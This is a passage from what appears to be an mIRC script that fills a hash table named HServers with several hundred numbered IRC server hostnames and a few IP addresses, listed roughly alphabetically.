+n644= hadd HServers 27 irc.alphatrade.com
+n645= hadd HServers 28 radioactivo.alterno.net
+n646= hadd HServers 29 irc.americhat.org
+n647= hadd HServers 30 irc.angelserv.de
+n648= hadd HServers 31 irc.animedemon.com
+n649= hadd HServers 32 irc.animeirc.de
+n650= hadd HServers 33 irc.animenetworks.org
+n651= hadd HServers 34 irc.anomalies.net
+n652= hadd HServers 35 irc.antarestar.org
+n653= hadd HServers 36 irc.anticapolis.net
+n654= hadd HServers 37 irc.ascends.net
+n655= hadd HServers 38 irc.ashnet.org
+n656= hadd HServers 39 irc.askcafe.net
+n657= hadd HServers 40 irc.astalavistababy.net
+n658= hadd HServers 41 irc.asylum-net.org
+n659= hadd HServers 42 irc.auirc.org
+n660= hadd HServers 43 irc.aunquesea.com
+n661= hadd HServers 44 aunquesea.com
+n662= hadd HServers 45 Amazing.AuroraIRC.net
+n663= hadd HServers 46 dreamflow.nl.eu.austnet.org
+n664= hadd HServers 47 bohica.tx.us.austnet.org
+n665= hadd HServers 48 yoyo.vic.au.austnet.org
+n666= hadd HServers 49 netspace.vic.au.austnet.org
+n667= hadd HServers 50 iinet.wa.au.austnet.org
+n668= hadd HServers 51 webmaster.ca.us.austnet.org
+n669= hadd HServers 52 mediacorp.sg.austnet.org
+n670= hadd HServers 53 starhub.sg.austnet.org
+n671= hadd HServers 54 pacific.sg.austnet.org
+n672= hadd HServers 55 tornado.no.eu.austnet.org
+n673= hadd HServers 56 pacific.nsw.au.austnet.org
+n674= hadd HServers 57 kas.vic.au.austnet.org
+n675= hadd HServers 58 irc.auzchat.com
+n676= hadd HServers 59 auzchat.com
+n677= hadd HServers 60 irc.awesomechat.net
+n678= hadd HServers 61 irc.axenet.org
+n679= hadd HServers 62 irc.axpi.net
+n680= hadd HServers 63 irc.azzurra.org
+n681= hadd HServers 64 tampere.fi.b2irc.net
+n682= hadd HServers 65 irc.balcan.net
+n683= hadd HServers 66 ircd.banglahouse.org
+n684= hadd HServers 67 irc.bararcade.com
+n685= hadd HServers 68 irc.bdchat.com
+n686= hadd HServers 69 irc.bdirc.net
+n687= hadd HServers 70 irc.bdspace.com
+n688= hadd HServers 71 irc.beatmix.net
+n689= hadd HServers 72 irc.beer-powered.com
+n690= hadd HServers 73 irc.belinou.net
+n691= hadd HServers 74 irc.beyondirc.net
+n692= hadd HServers 75 irc.biteme-irc.net
+n693= hadd HServers 76 irc.blackirc.com
+n694= hadd HServers 77 irc.blackirc.net
+n695= hadd HServers 78 irc.blacknights.net
+n696= hadd HServers 79 poofyirc.blacknights.net
+n697= hadd HServers 80 tampa.blacknights.net
+n698= hadd HServers 81 irc.blitzed.org
+n699= hadd HServers 82 irc.bloodheart.com
+n700= hadd HServers 83 bloodheart.com
+n701= hadd HServers 84 irc.bloz.net
+n702= hadd HServers 85 irc.boisworld.com
+n703= hadd HServers 86 irc.bongster.de
+n704= hadd HServers 87 irc.bordem.net
+n705= hadd HServers 88 irc.brasilinter.net
+n706= hadd HServers 89 irc.libnet.com.br
+n707= hadd HServers 90 irc.brasirc.net
+n708= hadd HServers 91 irc.matrix.net.br
+n709= hadd HServers 92 irc.brasirc.com.br
+n710= hadd HServers 93 BrasIRC.Com.Br
+n711= hadd HServers 94 irc.brasnerd.com.br
+n712= hadd HServers 95 eu.brasnet.org
+n713= hadd HServers 96 us.brasnet.org
+n714= hadd HServers 97 IRC.BravePhart.Com
+n715= hadd HServers 98 irc.brokenirc.net
+n716= hadd HServers 99 irc.bulgaria.org
+n717= hadd HServers 100 irc.cafecorner.com
+n718= hadd HServers 101 aisling.wa.us.cairdiuil.net
+n719= hadd HServers 102 irc.cairdiuil.net
+n720= hadd HServers 103 irc.careyjean.com
+n721= hadd HServers 104 irc.carnet.hr
+n722= hadd HServers 105 irc.centralchat.net
+n723= hadd HServers 106 irc.chataddicts.net
+n724= hadd HServers 107 irc.chat-fr.org
+n725= hadd HServers 108 irc.chat-net.org
+n726= hadd HServers 109 irc.poussy-chat.com
+n727= hadd HServers 110 irc.chat.tc
+n728= hadd HServers 111 Chat.TC
+n729= hadd HServers 112 irc.chat4all.org
+n730= hadd HServers 113 irc.chatcafe.net
+n731= hadd HServers 114 irc.chatchannel.org
+n732= hadd HServers 115 irc.chatcircuit.com
+n733= hadd HServers 116 irc.chatea.org
+n734= hadd HServers 117 irc.chatfactory.net
+n735= hadd HServers 118 irc.chatfirst.com
+n736= hadd HServers 119 irc.chatgalaxy.org
+n737= hadd HServers 120 irc.chatlands.org
+n738= hadd HServers 121 irc.chatlink.org
+n739= hadd HServers 122 au.chatnet.org
+n740= hadd HServers 123 irc.chatnplay.net
+n741= hadd HServers 124 irc.chatnut.net
+n742= hadd HServers 125 irc.chatpinoy.com
+n743= hadd HServers 126 irc.chatpinoy.org
+n744= hadd HServers 127 irc.chatpolis.com
+n745= hadd HServers 128 irc.chatpr.org
+n746= hadd HServers 129 irc.chatroom.org
+n747= hadd HServers 130 irc.chatsensations.com
+n748= hadd HServers 131 sensual.chatsensations.com
+n749= hadd HServers 132 irc.chat-solutions.org
+n750= hadd HServers 133 irc.chatsone.org
+n751= hadd HServers 134 irc.chatspike.net
+n752= hadd HServers 135 irc.chatstation.net
+n753= hadd HServers 136 irc.chatster.org
+n754= hadd HServers 137 irc.chatstop.net
+n755= hadd HServers 138 irc.chatstream.net
+n756= hadd HServers 139 irc.chattiamo.it
+n757= hadd HServers 140 Chattiamo.it
+n758= hadd HServers 141 irc.chattingaway.com
+n759= hadd HServers 142 phobos.chatty.nl
+n760= hadd HServers 143 Chatty.nl
+n761= hadd HServers 144 irc.chatworx.net
+n762= hadd HServers 145 irc.chatx.net
+n763= hadd HServers 146 irc.chatxplus.com
+n764= hadd HServers 147 irc.chilenos.org
+n765= hadd HServers 148 Chilenos.org
+n766= hadd HServers 149 irc.chill-out-time.net
+n767= hadd HServers 150 irc.ucnz.com
+n768= hadd HServers 151 ChristianIRC.net
+n769= hadd HServers 152 irc.christinamultimedia.com
+n770= hadd HServers 153 irc.chs-team.org
+n771= hadd HServers 154 irc.ciberuniversal.com
+n772= hadd HServers 155 irc.city-irc.com
+n773= hadd HServers 156 irc.cleanchat.net
+n774= hadd HServers 157 irc.cmedianetworks.net
+n775= hadd HServers 158 chat.cnn.com
+n776= hadd HServers 159 irc.soulfresh.net
+n777= hadd HServers 160 irc.codenix.net
+n778= hadd HServers 161 codenix.net
+n779= hadd HServers 162 irc.coolchat.net
+n780= hadd HServers 163 crashnet.pl
+n781= hadd HServers 164 irc.crazy-chat.net
+n782= hadd HServers 165 irc.crystalnet.org
+n783= hadd HServers 166 irc.ctcp.net
+n784= hadd HServers 167 irc.cyberarmy.net
+n785= hadd HServers 168 irc.cyberbase7.net
+n786= hadd HServers 169 irc.cyberchat.org
+n787= hadd HServers 170 irc.midus-fx.com
+n788= hadd HServers 171 irc.cyga.net
+n789= hadd HServers 172 irc.d2u.net
+n790= hadd HServers 173 irc.dabarnet.com
+n791= hadd HServers 174 irc.dark-storm.net
+n792= hadd HServers 175 irc.d-t-net.de
+n793= hadd HServers 176 irc.darkbolt.org
+n794= hadd HServers 177 irc.darkchat.co.uk
+n795= hadd HServers 178 irc.darker.net
+n796= hadd HServers 179 irc.darkfire.net
+n797= hadd HServers 180 irc.darkirc.net
+n798= hadd HServers 181 irc.darkmyst.org
+n799= hadd HServers 182 irc.darkmyths.net
+n800= hadd HServers 183 DarkMyths.net
+n801= hadd HServers 184 nebula.darkorion.net
+n802= hadd HServers 185 irc.darkorion.net
+n803= hadd HServers 186 DarkOrion.Net
+n804= hadd HServers 187 dask.info
+n805= hadd HServers 188 irc.Dataforce.org.uk
+n806= hadd HServers 189 Dataforce.org.uk
+n807= hadd HServers 190 irc.datamachine.net
+n808= hadd HServers 191 irc.daynet.org
+n809= hadd HServers 192 irc.decafe.org
+n810= hadd HServers 193 Decafe.Org
+n811= hadd HServers 194 irc.DeepIRC.net
+n812= hadd HServers 195 irc.deepspace.org
+n813= hadd HServers 196 irc.deltaconnexion.com
+n814= hadd HServers 197 irc.deluxe-irc.net
+n815= hadd HServers 198 irc.demonics.net
+n816= hadd HServers 199 irc.devcore.us
+n817= hadd HServers 200 IRC.DeviantNetWorks.Com
+n818= hadd HServers 201 irc.dhcnetwork.com
+n819= hadd HServers 202 irc.diabol0.de
+n820= hadd HServers 203 irc.different.net
+n821= hadd HServers 204 irc.digarix.net
+n822= hadd HServers 205 irc.digatech.net
+n823= hadd HServers 206 irc.digital-roots.com
+n824= hadd HServers 207 irc.digitalirc.net
+n825= hadd HServers 208 irc.dilexnet.net
+n826= hadd HServers 209 irc.discussioni.org
+n827= hadd HServers 210 Discussioni.org
+n828= hadd HServers 211 irc.disowned.org
+n829= hadd HServers 212 irc.rehash.net
+n830= hadd HServers 213 irc.distortid.org
+n831= hadd HServers 214 irc.dnwt.net
+n832= hadd HServers 215 duvel.dnwt.net
+n833= hadd HServers 216 fire.dnwt.net
+n834= hadd HServers 217 flawless.dnwt.net
+n835= hadd HServers 218 hellfire.dnwt.net
+n836= hadd HServers 219 irc.dockside.org
+n837= hadd HServers 220 irc.dominet.com.tr
+n838= hadd HServers 221 irc.doruk.net.tr
+n839= hadd HServers 222 irc.dragonchat.org
+n840= hadd HServers 223 DragonChat.org
+n841= hadd HServers 224 irc.dreamirc.com
+n842= hadd HServers 225 irc.dreamnet.org
+n843= hadd HServers 226 irc.drlnet.com
+n844= hadd HServers 227 irc.dustyservers.net
+n845= hadd HServers 228 dustyservers.net
+n846= hadd HServers 229 irc.dwarfstar.net
+n847= hadd HServers 230 irc.dwchat.net
+n848= hadd HServers 231 irc.dwchatta.com
+n849= hadd HServers 232 irc.dynastynet.net
+n850= hadd HServers 233 irc.e-Gangs.net
+n851= hadd HServers 234 chat.e-tycoon.net
+n852= hadd HServers 235 irc.easy-chat.net
+n853= hadd HServers 236 irc.echo-space.net
+n854= hadd HServers 237 irc.ecomstation.com
+n855= hadd HServers 238 irc.aroa.ch
+n856= hadd HServers 239 irc.ecomstation.com.au
+n857= hadd HServers 240 irc.ecomstation.ca
+n858= hadd HServers 241 irc.celkunststoffen.khlim.be
+n859= hadd HServers 242 irc.dacdigital.com
+n860= hadd HServers 243 irc.ecomstation.dk
+n861= hadd HServers 244 irc.dinosoft.it
+n862= hadd HServers 245 irc.ecssite.com
+n863= hadd HServers 246 irc.ecomstation.it
+n864= hadd HServers 247 irc.itisvinci.com
+n865= hadd HServers 248 irc.muravlenko.ytc.ru
+n866= hadd HServers 249 irc.ecomstation.nl
+n867= hadd HServers 250 irc.ecomstation.ru
+n868= hadd HServers 251 irc.ediction.org
+n869= hadd HServers 252 irc.eerie.us
+n870= hadd HServers 253 irc.egenet.com.tr
+n871= hadd HServers 254 irc.ejeet.net
+n872= hadd HServers 255 irc.eleethal.com
+n873= hadd HServers 256 irc.elite-chat.org
+n874= hadd HServers 257 irc.elite-irc.net
+n875= hadd HServers 258 irc.elitnet.org
+n876= hadd HServers 259 irc.emuparadise.org
+n877= hadd HServers 260 irc.EndeavorIRC.net
+n878= hadd HServers 261 irc.enterthegame.com
+n879= hadd HServers 262 irc.epiknet.org
+n880= hadd HServers 263 chat.epitha.com
+n881= hadd HServers 264 EpiTha.com
+n882= hadd HServers 265 irc.eschat.org
+n883= hadd HServers 266 morgoth.eschat.org
+n884= hadd HServers 267 esChat.org
+n885= hadd HServers 268 irc.esprit.net
+n886= hadd HServers 269 irc.estchat.ee
+n887= hadd HServers 270 irc.estirc.net
+n888= hadd HServers 271 irc.estnet.org
+n889= hadd HServers 272 black.estnet.org
+n890= hadd HServers 273 kellu.estnet.org
+n891= hadd HServers 274 irc.euirc.net
+n892= hadd HServers 275 irc.evolnet.org
+n893= hadd HServers 276 irc.eXagon.org
+n894= hadd HServers 277 exceter.serveirc.com
+n895= hadd HServers 278 irc.exiled.net
+n896= hadd HServers 279 irc.exodusirc.net
+n897= hadd HServers 280 koala.eyerc.net
+n898= hadd HServers 281 EYErc.net
+n899= hadd HServers 282 irc.eyerc.net
+n900= hadd HServers 283 usa.eyerc.net
+n901= hadd HServers 284 hcs.eyerc.net
+n902= hadd HServers 285 irc.faereal.net
+n903= hadd HServers 286 irc2.fastland.org
+n904= hadd HServers 287 PTgenesis.FBnet.org
+n905= hadd HServers 288 PTwarp.orgSERVER
+n906= hadd HServers 289 ptwarp.fbnet.org
+n907= hadd HServers 290 irc.fef.net
+n908= hadd HServers 291 irc.fhive.net
+n909= hadd HServers 292 irc.fireice.org.uk
+n910= hadd HServers 293 irc.firewirez.net
+n911= hadd HServers 294 FireWirez.Net
+n912= hadd HServers 295 irc.flamenet.za.net
+n913= hadd HServers 296 irc.fleetchat.org
+n914= hadd HServers 297 irc.fluxnet.org
+n915= hadd HServers 298 irc.fockernet.net
+n916= hadd HServers 299 irc.forestnet.org
+n917= hadd HServers 300 irc.foreverchat.net
+n918= hadd HServers 301 irc.foxchat.net
+n919= hadd HServers 302 irc.fr4g.com
+n920= hadd HServers 303 irc.fraggers.co.uk
+n921= hadd HServers 304 irc.freemech.net
+n922= hadd HServers 305 FreeNet.am
+n923= hadd HServers 306 irc.freequest.net
+n924= hadd HServers 307 irc.freeworld.nu
+n925= hadd HServers 308 irc.frozenet.net
+n926= hadd HServers 309 irc.fudo.org
+n927= hadd HServers 310 irc.furyhosting.com
+n928= hadd HServers 311 irc.fusionchat.net
+n929= hadd HServers 312 irc.futuristas.com
+n930= hadd HServers 313 Irc.FyreBird.Net
+n931= hadd HServers 314 FyreBird.Net
+n932= hadd HServers 315 irc.gamers-net.com
+n933= hadd HServers 316 irc.gamerzirc.ch
+n934= hadd HServers 317 irc.GamingDistrict.net
+n935= hadd HServers 318 irc.gdchat.org
+n936= hadd HServers 319 Amsterdam.NL.EU.GenericNet.Org
+n937= hadd HServers 320 irc.german-irc.net
+n938= hadd HServers 321 irc.gh0st4u.net
+n939= hadd HServers 322 Gh0st4u.Net
+n940= hadd HServers 323 irc.gigairc.net
+n941= hadd HServers 324 irc.global-irc-networks.net
+n942= hadd HServers 325 irc.Global-Dimension.org
+n943= hadd HServers 326 irc.global-irc.com
+n944= hadd HServers 327 irc.globalchat.org
+n945= hadd HServers 328 irc.globirc.net
+n946= hadd HServers 329 irc.vsh6.net
+n947= hadd HServers 330 irc.gloob.com.ar
+n948= hadd HServers 331 irc.go2chat.net
+n949= hadd HServers 332 irc.goldchat.nl
+n950= hadd HServers 333 srv.irc.gr
+n951= hadd HServers 334 Talon.GryphonForge.Com
+n952= hadd HServers 335 irc.gunet.org
+n953= hadd HServers 336 irc2.gunet.org
+n954= hadd HServers 337 irc.habber.net
+n955= hadd HServers 338 irc.hashmark.net
+n956= hadd HServers 339 irc.hawksrealm.net
+n957= hadd HServers 340 Run.HellaS-iRC.Com
+n958= hadd HServers 341 Chat.HellaS-iRC.Com
+n959= hadd HServers 342 irc.mirc.gr
+n960= hadd HServers 343 Virus.hell.gr
+n961= hadd HServers 344 irc.hell.gr
+n962= hadd HServers 345 Cyber.hell.gr
+n963= hadd HServers 346 Shadow.hell.gr
+n964= hadd HServers 347 Ghost.hell.gr
+n965= hadd HServers 348 Shells.hell.gr
+n966= hadd HServers 349 Balor.hell.gr
+n967= hadd HServers 350 Mirc.hell.gr
+n968= hadd HServers 351 Kernel.hell.gr
+n969= hadd HServers 352 irc.helpsupport.de
+n970= hadd HServers 353 bigchief.dk.eu.hemligt.net
+n971= hadd HServers 354 hemligt.net
+n972= hadd HServers 355 irc.highteq.de
+n973= hadd HServers 356 irc.hookahey.org
+n974= hadd HServers 357 irc.htmod.com
+n975= hadd HServers 358 irc.hybnet.net
+n976= hadd HServers 359 irc.i7c.org
+n977= hadd HServers 360 i7c.org
+n978= hadd HServers 361 irc.ice-inferno.com
+n979= hadd HServers 362 irc.icechat.net
+n980= hadd HServers 363 irc.iceforge.net
+n981= hadd HServers 364 irc.icq.com
+n982= hadd HServers 365 irc.idapnet.org
+n983= hadd HServers 366 irc.igl.net
+n984= hadd HServers 367 irc.ilbello.com
+n985= hadd HServers 368 ilbello.com
+n986= hadd HServers 369 Irc.Immondes.org
+n987= hadd HServers 370 Immondes.org
+n988= hadd HServers 371 irc.immortalz.org
+n989= hadd HServers 372 Irc.ImYerevan.Com
+n990= hadd HServers 373 irc.infinity-irc.org
+n991= hadd HServers 374 irc.infinitychat.co.uk
+n992= hadd HServers 375 irc.info-web.org
+n993= hadd HServers 376 irc.infomatrix.net
+n994= hadd HServers 377 irc.infoslash.org
+n995= hadd HServers 378 irc.inside3d.net
+n996= hadd HServers 379 irc.interex.net
+n997= hadd HServers 380 Interex.net
+n998= hadd HServers 381 chat.internet-irc.com
+n999= hadd HServers 382 irc.interpapo.net
+n1000= hadd HServers 383 irc.invisible-empire.com
+n1001= hadd HServers 384 irc.invisionz.org
+n1002= hadd HServers 385 central.invisionz.org
+n1003= hadd HServers 386 irc.iranirc.com
+n1004= hadd HServers 387 jupiter2.irc-hispano.org
+n1005= hadd HServers 388 omega.irc-hispano.org
+n1006= hadd HServers 389 66.33.2.250
+n1007= hadd HServers 390 XCalibur.OH.US.IRC-Freedom.Net
+n1008= hadd HServers 391 irc.irc-networking.com
+n1009= hadd HServers 392 irc.irc-neworld.org
+n1010= hadd HServers 393 irc-pinoy.com
+n1011= hadd HServers 394 eu.irc-solution.net
+n1012= hadd HServers 395 us.irc-solution.net
+n1013= hadd HServers 396 irc.irc-world.org
+n1014= hadd HServers 397 IRC-World.org
+n1015= hadd HServers 398 irc.ayva.org
+n1016= hadd HServers 399 irc.co.il
+n1017= hadd HServers 400 irc.hooverfans.com
+n1018= hadd HServers 401 irc.quanta.com.py
+n1019= hadd HServers 402 irc.batepapocm.com.br
+n1020= hadd HServers 403 irc.irccity.nl
+n1021= hadd HServers 404 chat.ircee.com
+n1022= hadd HServers 405 irc.ircforall.org
+n1023= hadd HServers 406 irc.ircfreunde.net
+n1024= hadd HServers 407 irc.ircgate.net
+n1025= hadd HServers 408 none.irc.ge
+n1026= hadd HServers 409 alcohol.irc.ge
+n1027= hadd HServers 410 tbilisi.irc.ge
+n1028= hadd HServers 411 qartu.irc.ge
+n1029= hadd HServers 412 irc.irchat.com.br
+n1030= hadd HServers 413 irc.irchat.tv
+n1031= hadd HServers 414 IRChat.tv
+n1032= hadd HServers 415 irc.irclatino.org
+n1033= hadd HServers 416 rockhill.sc.us.irclink.net
+n1034= hadd HServers 417 irc.ircmalta.org
+n1035= hadd HServers 418 irc.ircom.org
+n1036= hadd HServers 419 irc.ircsoulz.net
+n1037= hadd HServers 420 vx.ircspace.it
+n1038= hadd HServers 421 fireball.ircspace.it
+n1039= hadd HServers 422 irc.ircspace.it
+n1040= hadd HServers 423 penguin-it.ircspace.it
+n1041= hadd HServers 424 ircd.ircspace.it
+n1042= hadd HServers 425 netresistance.ircspace.it
+n1043= hadd HServers 426 v4ny.ircspace.it
+n1044= hadd HServers 427 irc.ircspace.net
+n1045= hadd HServers 428 i5x.ircspace.net
+n1046= hadd HServers 429 irc.ircSuper.net
+n1047= hadd HServers 430 sandra.tx.us.irctgnet.com
+n1048= hadd HServers 431 irc.irctoo.net
+n1049= hadd HServers 432 irc.irctr.net
+n1050= hadd HServers 433 irc.ircuk.co.uk
+n1051= hadd HServers 434 irc.ircworld.org
+n1052= hadd HServers 435 ircx.net.pl
+n1053= hadd HServers 436 ircx-city.dtdns.net
+n1054= hadd HServers 437 irc.irczone.net
+n1055= hadd HServers 438 dreamz.irczone.net
+n1056= hadd HServers 439 ion.irczone.net
+n1057= hadd HServers 440 monkey.irczone.net
+n1058= hadd HServers 441 IRCZone.Net
+n1059= hadd HServers 442 devious.irdsi.net
+n1060= hadd HServers 443 irc.revnet.org
+n1061= hadd HServers 444 irc.irvingnet.net
+n1062= hadd HServers 445 chat.ivoidz.com
+n1063= hadd HServers 446 irc.JetIRC.net
+n1064= hadd HServers 447 irc.jeux.fr
+n1065= hadd HServers 448 Jeux.Fr
+n1066= hadd HServers 449 Irc.jsab.net
+n1067= hadd HServers 450 irc.janfcs.org
+n1068= hadd HServers 451 irc.kampungchat.org
+n1069= hadd HServers 452 irc.kdfs.net
+n1070= hadd HServers 453 irc.kemik.net
+n1071= hadd HServers 454 Kemik.net
+n1072= hadd HServers 455 irc.kickchat.com
+n1073= hadd HServers 456 irc.kidsworld.org
+n1074= hadd HServers 457 irc.klchat.net
+n1075= hadd HServers 458 irc.knightirc.net
+n1076= hadd HServers 459 goldengate.ca.us.knightnet.net
+n1077= hadd HServers 460 irc.krey.net
+n1078= hadd HServers 461 irc.krimson.net
+n1079= hadd HServers 462 irc.krstarica.com
+n1080= hadd HServers 463 irc.lafazan.net
+n1081= hadd HServers 464 irc.lagnet.org.za
+n1082= hadd HServers 465 irc.langochat.net
+n1083= hadd HServers 466 MaDsOnE.LaZy-Net.de
+n1084= hadd HServers 467 irc.lcirc.net
+n1085= hadd HServers 468 irc.ldsirc.net
+n1086= hadd HServers 469 irc.lea-net.org
+n1087= hadd HServers 470 irc.leatherlust.net
+n1088= hadd HServers 471 irc.leetirc.com
+n1089= hadd HServers 472 irc.liberix.org
+n1090= hadd HServers 473 irc.librenet.net
+n1091= hadd HServers 474 irc.lighteningchat.net
+n1092= hadd HServers 475 lighteningchat.net
+n1093= hadd HServers 476 apcyberax.lightning-bolt.net
+n1094= hadd HServers 477 irc.likya.org
+n1095= hadd HServers 478 irc.linkirc.net
+n1096= hadd HServers 479 irc.link-net.org
+n1097= hadd HServers 480 www.linuxchat.net
+n1098= hadd HServers 481 linuxchat.net
+n1099= hadd HServers 482 irc.liquidirc.com
+n1100= hadd HServers 483 linkline.liveharmony.org
+n1101= hadd HServers 484 irc.lobi.net
+n1102= hadd HServers 485 irc.lockchat.net
+n1103= hadd HServers 486 irc.lokaweb.com
+n1104= hadd HServers 487 Irc.Lost-Dreams.Net
+n1105= hadd HServers 488 irc.lostrealm.net
+n1106= hadd HServers 489 irc.love-irc.org
+n1107= hadd HServers 490 LoVe-IRC.Org
+n1108= hadd HServers 491 irc.tavo.net
+n1109= hadd HServers 492 irc.m-sys.org
+n1110= hadd HServers 493 irc.macron.co.il
+n1111= hadd HServers 494 irc.madtiger.org
+n1112= hadd HServers 495 irc.magicstar.net
+n1113= hadd HServers 496 webmaster.malaynet.org
+n1114= hadd HServers 497 irc.matrix-network.org
+n1115= hadd HServers 498 irc.mavra.net
+n1116= hadd HServers 499 irc.meeschter.lu
+n1117= hadd HServers 500 Meeschter.lu
+n1118= hadd HServers 501 irc.meet-us.net
+n1119= hadd HServers 502 irc.meezerk.com
+n1120= hadd HServers 503 irc.memphisnet.org
+n1121= hadd HServers 504 irc.metachat.net
+n1122= hadd HServers 505 irc.mircd.org
+n1123= hadd HServers 506 Irc.Moua7.Com
+n1124= hadd HServers 507 irc.mydealer.org
+n1125= hadd HServers 508 irc.mysteria.net
+n1126= hadd HServers 509 irc.mystical.net
+n1127= hadd HServers 510 irc.mysticirc.net
+n1128= hadd HServers 511 irc.mysticnetwork.org
+n1129= hadd HServers 512 mysticnetwork.org
+n1130= hadd HServers 513 Irc.MysticShadows.Net
+n1131= hadd HServers 514 www.jeah.net
+n1132= hadd HServers 515 StarChat.Mystiquenet.net
+n1133= hadd HServers 516 irc.narancs.com
+n1134= hadd HServers 517 irc.nboxmedia.com
+n1135= hadd HServers 518 irc.necron.org
+n1136= hadd HServers 519 irc.neo-theone.com.ar
+n1137= hadd HServers 520 irc.neoxys.org
+n1138= hadd HServers 521 irc.net-france.com
+n1139= hadd HServers 522 irc.netirc.com.br
+n1140= hadd HServers 523 irc.netrusk.net
+n1141= hadd HServers 524 irc.netruss.com
+n1142= hadd HServers 525 irc.networkadvanced.net
+n1143= hadd HServers 526 irc.nevernet.net
+n1144= hadd HServers 527 irc.trusted-network.de
+n1145= hadd HServers 528 irc.uplink.net.nz
+n1146= hadd HServers 529 irc.newnet.net
+n1147= hadd HServers 530 irc.rma.edu
+n1148= hadd HServers 531 irc.nexuschat.net
+n1149= hadd HServers 532 irc.nexusirc.org
+n1150= hadd HServers 533 irc.nictr.net
+n1151= hadd HServers 534 irc.nightstar.net
+n1152= hadd HServers 535 irc.nimitz.be
+n1153= hadd HServers 536 irc.nitrousnet.net
+n1154= hadd HServers 537 irc.nix.org.il
+n1155= hadd HServers 538 irc.NixAddict.net
+n1156= hadd HServers 539 irc.nixus.org
+n1157= hadd HServers 540 irc.noksha.com
+n1158= hadd HServers 541 irc.nomadirc.net
+n1159= hadd HServers 542 208.27.69.193
+n1160= hadd HServers 543 nothingbutstyle.net
+n1161= hadd HServers 544 irc.novernet.com
+n1162= hadd HServers 545 irc.nullirc.net
+n1163= hadd HServers 546 irc.nullnet.net
+n1164= hadd HServers 547 irc.drama.nl
+n1165= hadd HServers 548 www.computers-romania.com
+n1166= hadd HServers 549 irc.offchat.org
+n1167= hadd HServers 550 OffChat.org
+n1168= hadd HServers 551 irc.omnesia.net
+n1169= hadd HServers 552 irc.onechat.net
+n1170= hadd HServers 553 irc.opal-irc.com
+n1171= hadd HServers 554 irc.orbitalfire.net
+n1172= hadd HServers 555 irc.othernet.org
+n1173= hadd HServers 556 irc.othersideirc.net
+n1174= hadd HServers 557 irc.outsiderz.com
+n1175= hadd HServers 558 aussie.sydney.oz.org
+n1176= hadd HServers 559 irc.paradise-chat.com
+n1177= hadd HServers 560 irc.partynet.org
+n1178= hadd HServers 561 irc.phasenet.co.uk
+n1179= hadd HServers 562 irc.phatchat.org
+n1180= hadd HServers 563 irc.phat-net.de
+n1181= hadd HServers 564 irc.phazenet.com
+n1182= hadd HServers 565 irc.phey.net
+n1183= hadd HServers 566 irc.philchat.net
+n1184= hadd HServers 567 irc.phishy.net
+n1185= hadd HServers 568 irc.p44.org
+n1186= hadd HServers 569 irc.pilgerer.org
+n1187= hadd HServers 570 irc.piranho.net
+n1188= hadd HServers 571 irc.ircnet.pl
+n1189= hadd HServers 572 irc.powerchat.org
+n1190= hadd HServers 573 powerchat.org
+n1191= hadd HServers 574 irc.pgpn.com
+n1192= hadd HServers 575 irc.prologitech.net
+n1193= hadd HServers 576 ProLogiTech.NET
+n1194= hadd HServers 577 chat.psionics.net
+n1195= hadd HServers 578 irc.psycholand.org
+n1196= hadd HServers 579 PsychoLand.org
+n1197= hadd HServers 580 irc.ptlink.net
+n1198= hadd HServers 581 ualg.ptnet.org
+n1199= hadd HServers 582 telepac2.ptnet.org
+n1200= hadd HServers 583 irc.ptnet.org
+n1201= hadd HServers 584 irc.PTwarp.org
+n1202= hadd HServers 585 irc.PTworld.org
+n1203= hadd HServers 586 irc.qchat.net
+n1204= hadd HServers 587 irc.quadconnection.com
+n1205= hadd HServers 588 irc.quakenet.eu.org
+n1206= hadd HServers 589 irc.QuantumIrc.net
+n1207= hadd HServers 590 QuantumIrc.net
+n1208= hadd HServers 591 irc.quickfox.tk
+n1209= hadd HServers 592 irc.r00tweb.com
+n1210= hadd HServers 593 irc.raptornet.org
+n1211= hadd HServers 594 irc.rav3.netSERVER
+n1212= hadd HServers 595 irc.rav3.net
+n1213= hadd HServers 596 Rav3.Net
+n1214= hadd HServers 597 irc.realirc.org
+n1215= hadd HServers 598 irc.rebelchat.org
+n1216= hadd HServers 599 irc.rebelirc.net
+n1217= hadd HServers 600 irc.recycled-irc.org
+n1218= hadd HServers 601 irc.red-latina.org
+n1219= hadd HServers 602 irc.wnet.com.br
+n1220= hadd HServers 603 irc.redex3.com
+n1221= hadd HServers 604 irc.redhispana.org
+n1222= hadd HServers 605 irc.rekor.net
+n1223= hadd HServers 606 irc.relic.net
+n1224= hadd HServers 607 irc.restrictid.org
+n1225= hadd HServers 608 irc.revxnet.org
+n1226= hadd HServers 609 irc.rezosup.org
+n1227= hadd HServers 610 irc.rirc.net
+n1228= hadd HServers 611 irc.Ritim.Net
+n1229= hadd HServers 612 irc.rizen.net
+n1230= hadd HServers 613 IRC.RomaniaIRC.ORG
+n1231= hadd HServers 614 213.154.113.9
+n1232= hadd HServers 615 irc.rsachat.za.net
+n1233= hadd HServers 616 irc.sachat.net
+n1234= hadd HServers 617 sachat.net
+n1235= hadd HServers 618 irc.saikou-fansubs.com
+n1236= hadd HServers 619 irc.sandnet.net
+n1237= hadd HServers 620 irc.sandrachat.net
+n1238= hadd HServers 621 irc.sapphire-services.org
+n1239= hadd HServers 622 irc.satanic-chat.net
+n1240= hadd HServers 623 irc.saxony.no-ip.info
+n1241= hadd HServers 624 irc.scarynet.org
+n1242= hadd HServers 625 irc.scenecritique.com
+n1243= hadd HServers 626 irc.scifi-fans.net
+n1244= hadd HServers 627 irc.scunc.net
+n1245= hadd HServers 628 irc.secureirc.org
+n1246= hadd HServers 629 irc.serbiancafe.ws
+n1247= hadd HServers 630 irc.serenia.net
+n1248= hadd HServers 631 irc.shadowfire.org
+n1249= hadd HServers 632 irc.shadowworld.net
+n1250= hadd HServers 633 irc.sharkservices.net
+n1251= hadd HServers 634 SharkServices.Net
+n1252= hadd HServers 635 irc.shockerz.net
+n1253= hadd HServers 636 irc.shuya.org
+n1254= hadd HServers 637 irc.sid-kitty-land.org
+n1255= hadd HServers 638 irc.sierranet.org
+n1256= hadd HServers 639 irc.simosnap.com
+n1257= hadd HServers 640 irc.aftran.com
+n1258= hadd HServers 641 irc.sinoptic.net
+n1259= hadd HServers 642 irc.slackernet.org
+n1260= hadd HServers 643 irc.slashnet.org
+n1261= hadd HServers 644 irc.smoothnet.org
+n1262= hadd HServers 645 jbworks.co.za
+n1263= hadd HServers 646 irc.solidirc.com
+n1264= hadd HServers 647 irc.soofas.co.uk
+n1265= hadd HServers 648 irc.sorcery.net
+n1266= hadd HServers 649 irc.spacetronix.net
+n1267= hadd HServers 650 irc.specialnet.org
